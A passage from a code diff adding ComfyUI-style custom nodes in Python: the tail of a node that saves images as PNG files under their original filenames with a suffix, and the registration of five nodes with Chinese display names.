+            print("Warning: SaveImageByFilename 节点收到空的 'filenames' 输入。")
+            return {"ui": {"string": ["错误: 文件名列表为空"]}}
+            
+        if len(pil_images) != len(paths):
+            print(f"Warning: 图像数量 ({len(pil_images)}) 与文件名数量 ({len(paths)}) 不匹配。将只保存较少数量的图像。")
+
+        main_output_dir = folder_paths.get_output_directory()
+        saved_count = 0
+        ui_image_info = []
+
+        for i, pil_image in enumerate(pil_images):
+            if i >= len(paths): break 
+
+            original_path = paths[i]
+            
+            if output_path:
+                final_save_dir = os.path.join(main_output_dir, output_path)
+                original_filename = os.path.basename(original_path)
+                base, ext = os.path.splitext(original_filename)
+            else:
+                final_save_dir = os.path.dirname(original_path)
+                original_filename = os.path.basename(original_path)
+                base, ext = os.path.splitext(original_filename)
+            
+            if not ext.lower() == ".png": ext = ".png"
+
+            os.makedirs(final_save_dir, exist_ok=True)
+            
+            new_filename_no_ext = f"{base}{suffix}"
+            new_path = os.path.join(final_save_dir, new_filename_no_ext + ext)
+            
+            counter = 1
+            while os.path.exists(new_path):
+                new_path = os.path.join(final_save_dir, f"{new_filename_no_ext} ({counter}){ext}")
+                counter += 1
+
+            pil_image.save(new_path, "PNG", compress_level=4)
+            saved_count += 1
+            
+            ui_filename = os.path.relpath(new_path, main_output_dir)
+            ui_subfolder = os.path.dirname(ui_filename)
+            ui_image_info.append({"filename": os.path.basename(ui_filename), "subfolder": ui_subfolder, "type": "output"})
+
+        return {"ui": {"images": ui_image_info, "string": [f"成功保存 {saved_count} 张高清图"]}}
+
+# ======================================================================
+# 统一节点注册
+# ======================================================================
+NODE_CLASS_MAPPINGS = {
+    "GroupRunnerConsole": GroupRunnerConsole,
+    "DynamicImageList": DynamicImageList,
+    "SaveImageByFilename": SaveImageByFilename,
+    "WujiaiModelBrowser": WujiaiModelBrowser,
+    "ApiKeyManager": ApiKeyManager
+}
+
+NODE_DISPLAY_NAME_MAPPINGS = {
+    "GroupRunnerConsole": "快速运行中控台",
+    "DynamicImageList": "图像动态列表",
+    "SaveImageByFilename": "💾 智能按文件名保存",
+    "WujiaiModelBrowser": "可选模型面板",
+    "ApiKeyManager": "🔑 API Key 管理器"
+}
